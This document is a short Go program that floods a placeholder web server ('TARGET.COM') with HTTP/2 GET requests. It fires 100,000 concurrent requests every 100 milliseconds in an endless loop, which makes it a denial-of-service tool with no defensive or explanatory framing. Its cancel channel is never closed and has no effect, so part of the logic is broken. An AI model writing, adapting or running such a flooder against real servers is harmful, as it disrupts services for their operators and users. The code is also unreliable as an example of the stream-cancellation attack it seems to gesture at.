package main

import (
	"net/http"
	"golang.org/x/net/http2"
	"sync"
	"time"
)

func main() {

	transport := &http2.Transport{}

	client := &http.Client{
		Transport: transport,
	}

	url := "https://TARGET.COM/" // (only HTTPS supported)

	numStreams := 100000

	cancelCh := make(chan struct{})

	var wg sync.WaitGroup

	for {
		for i := 0; i < numStreams; i++ {
			wg.Add(1)
			go func(i int) {
				defer wg.Done()

				req, err := http.NewRequest("GET", url, nil)
				if err != nil {
					return
				}

				_, _ = client.Do(req)


				select {
				case <-cancelCh:
				default:
				}
			}(i)
		}

		time.Sleep(100 * time.Millisecond)
	}


}
